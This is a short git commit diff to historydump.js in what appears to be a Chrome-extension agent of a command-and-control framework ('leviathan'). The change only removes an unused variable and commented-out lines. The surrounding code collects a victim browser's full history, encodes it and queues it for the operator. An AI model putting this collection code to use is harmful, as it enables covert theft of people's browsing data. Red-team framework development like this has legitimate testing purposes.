856c56ba8c685373c6d3fec983cea479e69e513c
Dean Hardcastle <dean@canva.com>
2021-08-13 15:31:20 +1000

    removed unused var and commented out code

--- Payload_Type/leviathan/agent_code/commands/historydump.js
+++ Payload_Type/leviathan/agent_code/commands/historydump.js
@@ -1,15 +1,12 @@
 exports.historydump = function(task) {
     try {
-        let results = [];
         chrome.history.search({"text": ""}, function(historyItems) {
-            // historyItems.forEach(function (item) {
             let response = {'task_id':task.id, 'user_output':JSON.stringify(historyItems, null, 2), 'completed':true};
             let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
             let enc = JSON.stringify(outer_response);
             let final = apfell.apfellid + enc;
             let msg = btoa(unescape(encodeURIComponent(final)));
             out.push(msg);
-            // });
         });
     } catch (error) {
         let response = {"task_id":task.id, "user_output":error.toString(), "completed": true, "status":"error"};
